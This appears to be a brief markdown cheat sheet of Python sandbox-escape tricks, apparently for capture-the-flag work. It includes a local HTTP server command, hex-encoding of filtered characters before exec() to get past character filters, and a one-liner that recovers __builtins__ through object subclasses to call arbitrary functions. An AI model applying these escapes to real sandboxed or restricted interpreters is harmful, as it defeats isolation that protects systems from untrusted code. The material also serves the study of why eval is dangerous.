# Useful
## Local HTTPServer
- `python3 -m http.server 80`
- `python -m SimpleHTTPServer 80`

## File template
```python
#!/usr/bin/env python3


def main():
    pass


if __name__ == '__main__':
    main()
```

# Characters not allowed
Python commands can be run in hex form:
```python
string = 'command to be executed'
chars_not_allowed = '[]{}.1'
encoded = ['\\x' + x.encode('hex') for x in chars_not_allowed]
for i in range(len(encoded)):
    string = string.replace(chars_not_allowed[i], encoded[i])
exec(string)
```
Note: The transitions back only happen when the hex is in a string! You might want to escape `'` and `"` in the string!

Note: Try adding more `\\`'s if it doesn't work (`\\`, `\\\\`, `\\\\\\\\`)

# Recovering builtins
Whenever you're in a situation where `{'__builtins__': None}`, the builtins can be recovered.

`s = "[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['FUNCTIONNAME'](ARGUMENTS)"; exec(s, {'builtins': None})`

[More info](https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html)
